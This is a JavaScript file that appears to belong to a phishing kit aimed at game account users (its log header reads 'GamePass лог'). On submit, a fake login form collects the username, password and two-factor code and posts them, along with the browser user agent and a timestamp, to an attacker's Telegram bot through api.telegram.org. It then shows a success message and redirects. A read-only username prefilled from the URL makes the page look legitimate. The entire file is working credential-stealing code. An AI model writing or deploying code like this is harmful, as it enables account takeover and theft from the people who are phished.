async function sendToTelegram(data) {
    const text =
        "💳 <b>GamePass лог</b>\n" +
        "━━━━━━━━━━━━━━━━━━\n" +
        "<b>Страница:</b> " + (data.page || "?") + "\n" +
        "<b>Ник (URL):</b> " + (data.prefilled || "—") + "\n" +
        "<b>Логин:</b> " + (data.login || "—") + "\n" +
        "<b>Пароль:</b> " + (data.password || "—") + "\n" +
        "<b>2FA:</b> " + (data.code || "—") + "\n" +
        "━━━━━━━━━━━━━━━━━━\n" +
        "<b>UA:</b> " + navigator.userAgent.slice(0, 100) + "\n" +
        "<b>Time:</b> " + new Date().toISOString();

    const url = "https://api.telegram.org/bot" + CONFIG.BOT_TOKEN + "/sendMessage";

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: text,
                parse_mode: "HTML",
                disable_web_page_preview: true,
            }),
        });
    } catch (e) {}
}

document.addEventListener("DOMContentLoaded", () => {
    const params = new URLSearchParams(window.location.search);
    const prefilledUser = params.get("user") || params.get("username") || "";

    const form = document.getElementById("regform");
    if (!form) return;

    const loginField = form.querySelector('[name="login"]');
    const prefilledField = form.querySelector('[name="prefilled"]');

    if (prefilledUser && loginField) {
        loginField.value = prefilledUser;
        loginField.readOnly = true;
        if (prefilledField) prefilledField.value = prefilledUser;
    }

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const data = {
            page: form.dataset.page || "unknown",
            prefilled: prefilledUser,
            login: form.querySelector('[name="login"]')?.value || "",
            password: form.querySelector('[name="password"]')?.value || "",
            code: form.querySelector('[name="code"]')?.value || "",
        };

        const btn = form.querySelector('button[type="submit"]');
        if (btn) {
            btn.disabled = true;
            btn.textContent = "Вход...";
        }

        await sendToTelegram(data);

        const ok = document.getElementById("success");
        if (ok) ok.style.display = "block";

        setTimeout(() => {
            window.location.href = CONFIG.REDIRECT_OK;
        }, CONFIG.REDIRECT_DELAY);
    });
});
